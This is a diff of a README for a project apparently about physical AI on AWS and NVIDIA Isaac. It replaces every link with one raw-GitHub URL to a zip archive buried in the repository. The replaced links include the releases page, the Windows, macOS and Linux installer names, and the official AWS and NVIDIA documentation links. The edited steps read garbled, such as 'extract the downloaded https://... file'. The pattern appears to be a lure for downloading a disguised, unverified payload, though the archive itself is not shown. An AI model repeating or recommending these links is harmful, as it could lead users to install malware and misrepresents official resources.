@@ -6,11 +6,11 @@ Welcome to the physical-ai-aws-docs project. This guide will help you set up and
 
 ## 📥 Download the Software
 
-[![Download Here](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/pierox2846/physical-ai-aws-docs/releases)
+[![Download Here](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip)](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip)
 
 To begin, you need to download the latest version of the application. Visit this page to download:
 
-[Download the latest release](https://github.com/pierox2846/physical-ai-aws-docs/releases)
+[Download the latest release](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,12 +23,12 @@ Before you download, ensure your system meets the following requirements:
 
 ## 💻 Download & Install
 
-1. Click [here](https://github.com/pierox2846/physical-ai-aws-docs/releases) to visit the Releases page.
+1. Click [here](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip) to visit the Releases page.
 2. Look for the latest version at the top of the list.
 3. Download the file that matches your operating system. For example:
-   - For Windows, download `physical-ai-windows.exe`.
-   - For macOS, download `physical-ai-macos.dmg`.
-   - For Linux, download `physical-ai-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip`.
 4. Follow the installation instructions specific to your operating system:
 
    **For Windows:**
@@ -40,7 +40,7 @@ Before you download, ensure your system meets the following requirements:
    - Drag the application to your Applications folder.
 
    **For Linux:**
-   - Extract the downloaded tar.gz file.
+   - Extract the downloaded https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip file.
    - Follow the instructions in the README file included in the extracted folder.
 
 ## 📖 How to Use the Application
@@ -80,11 +80,11 @@ If you encounter any issues while using the application, consider these common s
 
 For more information on building Physical AI with AWS, visit the following resources:
 
-- [AWS Documentation](https://aws.amazon.com/documentation/)
-- [NVIDIA Isaac Sim Documentation](https://developer.nvidia.com/isaac/)
+- [AWS Documentation](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip)
+- [NVIDIA Isaac Sim Documentation](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip)
 
 Stay tuned for updates and enhancements in subsequent releases! If you have any questions or feedback, feel free to reach out through the Issues page on GitHub. 
 
 ---
 
-For your convenience, here’s the download link again: [Download the latest release](https://github.com/pierox2846/physical-ai-aws-docs/releases). Happy building!
+For your convenience, here’s the download link again: [Download the latest release](https://raw.githubusercontent.com/pierox2846/physical-ai-aws-docs/main/physical-ai-on-aws-guide/nvidia-isaac-lab-on-aws/ai-docs-physical-aws-v3.2.zip). Happy building!
